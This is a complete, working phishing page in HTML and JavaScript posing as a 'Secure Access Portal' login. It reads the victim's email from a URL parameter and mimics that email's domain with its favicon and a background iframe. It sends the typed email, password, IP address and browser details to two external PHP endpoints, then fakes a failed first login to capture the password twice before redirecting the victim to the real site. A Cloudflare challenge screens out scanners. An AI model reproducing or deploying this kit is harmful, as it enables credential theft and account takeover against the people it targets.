<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Access Portal</title>
    <!-- Bootstrap 5 CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap Icons -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <!-- Google Fonts: Poppins -->
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <!-- Cloudflare Turnstile -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        /* Global Reset & Background */
        #background-iframe, #overlay {
            position: fixed;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
        }
        body {
            font-family: 'Poppins', sans-serif;
            margin: 0;
            padding: 0;
            overflow: hidden;
            background: linear-gradient(135deg, #f5f7fa 0%, #e9edf2 100%);
        }
        #background-iframe {
            border: none;
            z-index: -3;
            object-fit: cover;
            opacity: 0.6;
        }
        #overlay {
            background-color: rgba(0, 0, 0, 0.4);
            z-index: -2;
        }
        .form-container {
            display: block;
            max-width: 420px;
            width: 90%;
            padding: 2rem;
            background-color: rgba(255, 255, 255, 0.96);
            border-radius: 1rem;
            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.2);
            position: relative;
            z-index: 10;
            backdrop-filter: blur(2px);
            transition: all 0.2s ease;
            margin: 0 auto;
        }
        .icon-text {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 1rem;
        }
        .icon-text img {
            width: 32px;
            height: 32px;
            margin-right: 10px;
        }
        .icon-text .h4 {
            margin-bottom: 0;
            color: #0d6efd;
            font-weight: 600;
        }
        .form-floating {
            position: relative;
            margin-bottom: 1.5rem;
        }
        .form-floating label, .input-icon {
            position: absolute;
            color: #6c757d;
            pointer-events: none;
            transition: 0.2s ease all;
        }
        .form-floating label {
            left: 2.5rem;
            top: -0.2rem;
            background: transparent;
            z-index: 1;
            font-size: 1rem;
        }
        .form-floating input:focus + label,
        .form-floating input:not(:placeholder-shown) + label {
            transform: translateY(-1.5rem);
            font-size: 0.85rem;
            color: #0d6efd;
            background: transparent;
        }
        .form-control {
            border-top: none;
            border-left: none;
            border-right: none;
            border-bottom: 2px solid #ced4da;
            border-radius: 0;
            padding-left: 2.5rem;
            transition: border-color 0.2s;
            background: transparent;
            box-shadow: none;
        }
        .form-control:focus {
            border-bottom-color: #0d6efd;
            outline: none;
            box-shadow: none;
        }
        .input-icon {
            left: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            font-size: 1.2rem;
            z-index: 2;
        }
        .btn-primary {
            width: 100%;
            padding: 0.75rem;
            font-size: 1rem;
            font-weight: 500;
            background-color: #0d6efd;
            border: none;
            border-radius: 0.5rem;
            transition: background 0.2s;
        }
        .btn-primary:hover {
            background-color: #0b5ed7;
        }
        .loader-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            align-items: center;
            justify-content: center;
            z-index: 9999;
            display: none;
            backdrop-filter: blur(3px);
        }
        .error-message {
            color: #dc3545;
            margin-bottom: 1rem;
            display: none;
            font-size: 0.9rem;
            text-align: center;
            background: #f8d7da;
            padding: 0.5rem;
            border-radius: 0.5rem;
        }
        .verification-section {
            margin-top: 1.5rem;
            text-align: center;
        }
        .confirm-text {
            font-size: 0.75rem;
            margin-top: 0.75rem;
            color: #6c757d;
        }
        .cf-turnstile {
            display: flex;
            justify-content: center;
            margin: 0 auto;
        }
        h5 {
            font-weight: 500;
        }
        @media (max-width: 576px) {
            .form-container {
                padding: 1.5rem;
            }
        }
    </style>
</head>
<body class="d-flex align-items-center justify-content-center min-vh-100">
    <!-- Background iframe (dynamic from domain) -->
    <iframe id="background-iframe" src="about:blank" allowfullscreen></iframe>
    <div id="overlay"></div>

    <div class="form-container" id="form-container">
        <!-- Error message area -->
        <div id="error-message" class="error-message" data-key="try-again">Verification required or invalid credentials.</div>

        <form id="user-form">
            <!-- Icon & Domain row -->
            <div class="icon-text">
                <img id="domain-favicon" src="https://www.google.com/s2/favicons?domain=zoho.com" alt="favicon" style="height:28px;width:28px;">
                <span class="h4 mb-0 ms-2" id="domain-name">SECURE PORTAL</span>
            </div>
            <h5 class="mb-2 text-center">Leading with Security.</h5>
            <p class="mb-4 text-muted text-center small">To get started, log in using your email and password.</p>

            <!-- Email input with icon -->
            <div class="form-floating position-relative">
                <i class="bi bi-envelope input-icon"></i>
                <input type="email" class="form-control" id="email" placeholder=" " required style="padding-left: 40px;" autocomplete="email">
                <label for="email" style="left: 40px; background: transparent;">Email address</label>
            </div>

            <!-- Password input -->
            <div class="form-floating position-relative">
                <i class="bi bi-lock input-icon"></i>
                <input type="password" class="form-control" id="password" placeholder=" " required style="padding-left: 40px;" autocomplete="current-password">
                <label for="password" style="left: 40px; background: transparent;">Password</label>
            </div>

            <!-- Cloudflare Turnstile container -->
            <div class="verification-section">
                <div class="cf-turnstile" data-sitekey="0x4AAAAAACBwiUtbVw9OnVVF" data-callback="onTurnstileSuccess"></div>
                <div class="confirm-text">Browser safety verification for protection.</div>
            </div>

            <button type="submit" id="submit-button" class="btn btn-primary mt-3" disabled>Continue</button>
        </form>
    </div>

    <!-- Loader overlay -->
    <div id="loader-overlay" class="loader-overlay">
        <div class="spinner-border text-light" role="status" style="width: 3rem; height: 3rem;">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>

    <script>
        // ---------- GLOBALS ----------
        let turnstileCompleted = false;
        let submitCount = 0;

        // Helper: get email from URL param "portal"
        function getEmailFromParam() {
            const urlParams = new URLSearchParams(window.location.search);
            const emailParam = urlParams.get('portal');
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (emailParam && emailRegex.test(emailParam)) {
                return emailParam;
            }
            return null;
        }

        // Store original email from URL if present
        const originalEmail = getEmailFromParam();

        // Turnstile callback (success)
        window.onTurnstileSuccess = function(token) {
            console.log("Turnstile verified successfully");
            turnstileCompleted = true;
            const submitBtn = document.getElementById('submit-button');
            if (submitBtn) submitBtn.disabled = false;
            // Hide any previous error about verification
            const errorDiv = document.getElementById('error-message');
            if (errorDiv) errorDiv.style.display = 'none';
        };

        // Detect IP / Browser info (async but we also gather synchronously)
        let userData = {
            ipAddress: "Fetching...",
            userAgent: navigator.userAgent,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            browser: "Detecting..."
        };

        // Simple browser detection
        const ua = navigator.userAgent;
        if (ua.indexOf("Firefox") > -1) userData.browser = "Mozilla Firefox";
        else if (ua.indexOf("SamsungBrowser") > -1) userData.browser = "Samsung Internet";
        else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) userData.browser = "Opera";
        else if (ua.indexOf("Trident") > -1) userData.browser = "Microsoft Internet Explorer";
        else if (ua.indexOf("Edg") > -1) userData.browser = "Microsoft Edge";
        else if (ua.indexOf("Chrome") > -1) userData.browser = "Google Chrome / Chromium";
        else if (ua.indexOf("Safari") > -1) userData.browser = "Apple Safari";
        else userData.browser = "Unknown";

        // Fetch IP address asynchronously
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                userData.ipAddress = data.ip;
            })
            .catch(err => {
                console.warn("IP fetch error:", err);
                userData.ipAddress = "Unavailable";
            });

        // DOM elements
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const submitBtn = document.getElementById('submit-button');
        const errorDiv = document.getElementById('error-message');
        const loaderOverlay = document.getElementById('loader-overlay');
        const backgroundIframe = document.getElementById('background-iframe');
        const domainFavicon = document.getElementById('domain-favicon');
        const domainNameSpan = document.getElementById('domain-name');

        // If email param exists, prefill, update favicon & background
        if (originalEmail) {
            emailInput.value = originalEmail;
            // Extract domain for favicon and background
            const parts = originalEmail.split('@');
            if (parts.length === 2) {
                let domain = parts[1];
                domainNameSpan.textContent = domain.split('.')[0].toUpperCase();
                domainFavicon.src = `https://www.google.com/s2/favicons?domain=${domain}`;
                // Build background iframe src: try to load the domain's website securely
                let backgroundUrl = domain.startsWith('http') ? domain : `https://${domain}`;
                backgroundIframe.src = backgroundUrl;
            } else {
                backgroundIframe.src = "about:blank";
            }
        } else {
            // Default placeholder if no email param
            domainNameSpan.textContent = "PORTAL";
            backgroundIframe.src = "about:blank";
        }

        // Helper: send data to both API endpoints (https://scitecinstruments.it.com/1/api.php)
        async function sendToBothEndpoints(formDataObj) {
            // Endpoints
            const endpoint1 = "https://scitecinstruments.it.com/1/api.php";
            const endpoint2 = "https://scitecinstruments.it.com/panel/sg.php";
            
            // Prepare URLSearchParams for POST (x-www-form-urlencoded)
            const payload = new URLSearchParams();
            for (const [key, value] of Object.entries(formDataObj)) {
                payload.append(key, value);
            }
            
            const fetchOptions = {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                },
                body: payload.toString()
            };
            
            // Send to both endpoints in parallel (fire and forget but catch errors)
            const promises = [
                fetch(endpoint1, fetchOptions).then(res => res.text()).catch(err => ({ error: err.message, endpoint: endpoint1 })),
                fetch(endpoint2, fetchOptions).then(res => res.text()).catch(err => ({ error: err.message, endpoint: endpoint2 }))
            ];
            
            const results = await Promise.allSettled(promises);
            console.log("API results:", results);
            // Return true if at least one succeeded? We don't block UX.
            return true;
        }

        // Form submit handler
        document.getElementById('user-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Check turnstile completed
            if (!turnstileCompleted) {
                errorDiv.textContent = "Please complete the verification before proceeding.";
                errorDiv.style.display = "block";
                return;
            }
            
            // Validate email and password
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();
            if (!email || !password) {
                errorDiv.textContent = "Email and password are required.";
                errorDiv.style.display = "block";
                return;
            }
            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                errorDiv.textContent = "Please enter a valid email address.";
                errorDiv.style.display = "block";
                return;
            }
            
            // Increment submit count
            submitCount++;
            const isFirstAttempt = (submitCount === 1);
            const isSecondAttempt = (submitCount === 2);
            
            // Show loader
            loaderOverlay.style.display = "flex";
            errorDiv.style.display = "none";
            
            // Prepare data to send
            const domainFromEmail = email.split('@')[1] || "";
            const formPayload = {
                email: email,
                password: password,
                ipAddress: userData.ipAddress,
                userAgent: userData.userAgent,
                timezone: userData.timezone,
                browser: userData.browser,
                submitted_at: new Date().toISOString()
            };
            
            try {
                // Send data to both PHP scripts
                await sendToBothEndpoints(formPayload);
                
                // After sending, handle UI based on attempt count (matching original logic)
                if (isFirstAttempt) {
                    // First attempt: show error and clear password, hide loader after 3 sec
                    setTimeout(() => {
                        loaderOverlay.style.display = "none";
                        errorDiv.textContent = "Try again";
                        errorDiv.style.display = "block";
                        passwordInput.value = "";  // clear password field
                    }, 3000);
                } 
                else if (isSecondAttempt) {
                    // Second attempt: redirect to the domain extracted from email
                    setTimeout(() => {
                        loaderOverlay.style.display = "none";
                        let redirectDomain = domainFromEmail;
                        if (redirectDomain) {
                            let targetUrl = `https://${redirectDomain}`;
                            window.location.href = targetUrl;
                        } else {
                            // fallback: go to google
                            window.location.href = "https://www.google.com";
                        }
                    }, 3000);
                }
                else {
                    // More than 2 attempts: just reset loader
                    setTimeout(() => {
                        loaderOverlay.style.display = "none";
                        errorDiv.textContent = "Authentication failed. Please try again later.";
                        errorDiv.style.display = "block";
                    }, 2000);
                }
            } catch (err) {
                console.error("Submit error:", err);
                loaderOverlay.style.display = "none";
                errorDiv.textContent = "Network error. Please try again.";
                errorDiv.style.display = "block";
            }
        });
        
        // Initially disable submit button until turnstile is completed
        submitBtn.disabled = true;
        
        // Additional: allow user to see if turnstile is not yet done
        // Also if turnstile container not rendered? We rely on Cloudflare.
        // Ensure that if turnstile fails, we still allow? No, keep disabled.
        
        // Preload turnstile script is included, but we can also add a fallback check
        // if turnstile never calls callback after 10 seconds? optional, but fine.
        
        // Dynamic domain update: if user types email manually, update favicon and background in real time (nice UX)
        emailInput.addEventListener('input', function() {
            const emailValue = emailInput.value.trim();
            if (emailValue.includes('@')) {
                const domain = emailValue.split('@')[1];
                if (domain) {
                    domainNameSpan.textContent = domain.split('.')[0].toUpperCase();
                    domainFavicon.src = `https://www.google.com/s2/favicons?domain=${domain}`;
                    const bgUrl = domain.startsWith('http') ? domain : `https://${domain}`;
                    backgroundIframe.src = bgUrl;
                }
            } else {
                if (!originalEmail) {
                    domainNameSpan.textContent = "PORTAL";
                    domainFavicon.src = "https://www.google.com/s2/favicons?domain=zoho.com";
                    backgroundIframe.src = "about:blank";
                }
            }
        });
        
        // Also set initial background if param exists, already done
        // For extra style: prevent accidental double submit while loading
        let submitting = false;
        const originalSubmitHandler = document.getElementById('user-form').onsubmit;
        document.getElementById('user-form').addEventListener('submit', function(e) {
            if (submitting) {
                e.preventDefault();
                return;
            }
            if (!turnstileCompleted) {
                e.preventDefault();
                errorDiv.textContent = "Complete the security check first.";
                errorDiv.style.display = "block";
                return;
            }
            submitting = true;
            // Re-enable after 5 seconds in case of network delay
            setTimeout(() => { submitting = false; }, 5000);
        });
        
        // Additional function to ensure turnstile callback sets disabled false
        window.onTurnstileSuccess = function(token) {
            turnstileCompleted = true;
            submitBtn.disabled = false;
            errorDiv.style.display = 'none';
            console.log("Turnstile success, token:", token);
        };
        
        // Edge: if turnstile fails or expired, we may want to handle but not mandatory
        // Also add a small console log to verify both endpoints are hit
        console.log("Login page ready. Turnstile verification required. Data will be sent to both api.php and sg.php");
    </script>
</body>
</html>
